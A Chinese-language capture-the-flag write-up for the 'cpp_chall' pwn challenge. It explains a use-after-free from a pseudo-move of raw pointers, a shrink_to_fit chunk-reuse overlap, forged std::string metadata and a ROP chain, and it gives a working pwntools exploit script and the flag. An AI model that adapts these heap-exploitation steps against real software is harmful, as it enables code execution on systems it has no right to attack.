# cpp_chall

## 题目简述

程序用 `std::vector<CVE>` 管理 CVE 条目，每个元素只保存一个裸 `std::string *` 和两个整数。目标为 x86-64 PIE，Full RELRO、Canary、NX 均开启，并随解法提供对应 `libc.so.6`。主利用链不是栈溢出，而是 `post_CVE()` 删除字符串对象后仍在 vector 中保留悬空指针，再借 `shrink_to_fit()` 的堆块复用制造 vector 与 `std::string` 对象重叠，最终伪造字符串元数据取得任意读写。

## 解题过程

### 悬空指针与自引用重叠

`post_CVE()` 对包含裸指针的结构执行 `std::move`。这只是复制指针，并不会把原元素清空：

```cpp
CVE entry = std::move(vect[index]);
// ...
delete entry.desc;
```

因此 `vect[index].desc` 仍指向已释放的 `std::string` 对象。程序另外把多个索引边界写成 `index >= vect.capacity()` 而非 `vect.size()`，也会允许访问逻辑范围外的槽位；官方主链使用的是前述 UAF。

堆布局按下列顺序准备：

```python
create(b"AAAAAAA", 0, 0x20)
create(b"B" * 0x400, 0, 0x20)
create(b"CCCCCCC", 2025, 12)

post(0, b"")  # delete 第一个 std::string，vector[0].desc 悬空
delete(2)      # erase 后 shrink_to_fit()
```

64 位 libstdc++ 中 `CVE` 为 16 字节，两个元素的新 vector 缓冲区需要 32 字节，恰好与刚释放的 `std::string` 对象处于同一 glibc `0x30` 大小类。`shrink_to_fit()` 因而可把新 vector 缓冲区分配到旧字符串对象的位置；而复制后的 `vect[0].desc` 又指回这个缓冲区自身。

此后 `show(0)` 会把 vector 起始内容当成 `std::string` 对象解释，可泄露堆地址；`modify(0)` 则通过 `getline` 操作这份伪字符串元数据，可以改写数据指针、长度及相邻堆状态。

### 从任意读到栈上 ROP

官方 exploit 针对随题 libc 和该构建执行以下阶段：

1. 通过重叠字符串泄露堆地址，并用一次较长的 `modify` 调整相邻块状态。
2. 将伪 `std::string` 的数据指针指向堆上的 unsorted-bin 元数据，读取 `main_arena+96`，据此计算 libc 基址。
3. 把数据指针改为 libc 的 `environ`，读取栈地址。
4. 由 `environ-0x150` 定位当前 `modify_description()` 的保存返回地址。
5. 将另一条目的字符串指针指向该返回地址，写入 `pop rdi; ret`、`/bin/sh` 和 `system` 组成的 ROP 链。

关键利用序列为：

```python
heap_leak = u64(show(0).split(b":")[1].strip()[:8])

# 官方构建专用的堆整形；随后把伪 string 指向 unsorted-bin 泄露位置
modify(0, b"A" * 0xC0 + p64(0x4141414141414141) + p64(0x31) + p8(0xE0))
arena_slot = heap_leak + 0x870
modify(0, p64(arena_slot) + p64(8) + p64(0x4141414141414141))

arena_leak = u64(show(1).split(b":")[1].strip(b"\n")[1:9])
libc.address = arena_leak - libc.sym["main_arena"] - 96

# 任意读 environ，得到栈地址
modify(0, p64(libc.sym["environ"]) + p64(8))
stack = u64(show(1).split(b":")[1].strip(b"\n")[1:9])

# 把伪 string 指向保存 RIP，再由 modify(1, ...) 完成任意写
modify(0, p64(stack - 0x150) + p64(7))
pop_rdi = libc.address + 0x10F75B
bin_sh = next(libc.search(b"/bin/sh"))
modify(1, flat(pop_rdi, bin_sh, pop_rdi + 1, libc.sym["system"]))
```

取得 shell 后读取随服务部署的 `flag.txt`。仓库中的实际文本是：

```text
shellamtes{wIZArd_0F_thE_sTL}
```

这里的 `shellamtes` 是公开 flag 文件中的原始拼写，不能擅自改成 `shellmates`。

`0x870`、`environ-0x150` 和 gadget 偏移都依赖该二进制、libstdc++、glibc 与堆分配顺序。公开 solver 没有把这部分抽象成跨版本利用；复现时应使用随题二进制和 libc，并在 GDB 中验证重叠块、arena 泄露和保存 RIP，而不是把这些数字当成通用常量。

## 方法总结

- 核心技巧：裸指针结构的伪 move 导致 UAF，`shrink_to_fit()` 再把 vector 缓冲区复用到已释放 `std::string` 对象上，形成可伪造字符串元数据的对象重叠。
- 识别信号：C++ 容器元素保存手工管理的指针、移动后显式 `delete`、原元素未清空，同时频繁 `shrink_to_fit()` 时，应检查悬空指针与 allocator 大小类复用。
- 复用要点：先把重叠转成稳定的地址泄露，再逐步构造任意读、libc 泄露、栈泄露和任意写；堆偏移必须按目标版本动态验证。
